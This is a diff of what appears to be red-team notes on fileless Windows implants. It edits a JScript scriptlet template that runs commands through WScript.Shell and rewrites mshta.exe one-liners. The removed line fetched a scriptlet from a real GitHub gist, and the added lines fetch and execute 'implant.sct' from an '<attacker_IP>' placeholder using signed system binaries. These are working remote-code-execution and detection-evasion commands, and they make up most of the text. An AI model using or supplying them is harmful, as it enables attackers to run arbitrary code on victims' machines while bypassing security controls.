@@ -23,7 +23,7 @@ Fileless scriptlet implant template.
     classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
     <script language="JScript">
         <![CDATA[
-            var r = new ActiveXObject("WScript.Shell").Run("<commands>");    
+            var execute = new ActiveXObject("WScript.Shell").Run("<commands>");    
         ]]>
 </script>
 </registration>
@@ -41,7 +41,9 @@ C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script
 ### 1.2 - `mshta.exe`
 
 ```
-mshta javascript:o=GetObject("script:https://gist.githubusercontent.com/NickTyrer/0598b60112eaafe6d07789f7964290d5/raw/7717cfad109fc15a6796dd9119b0267f7a4df3fd/power.sct");o.Exec();close();
+C:\> mshta.exe javascript:execute=GetObject("script:http[s]://<attacker_IP>/implant.sct");execute.Exec();close();
+
+C:\> mshta.exe vbscript:Close(Execute("GetObject(""script:http[s]://<attacker_IP>/implant.sct"")"))
 ```
 
 ### 1.3 - `regsvr32.exe`
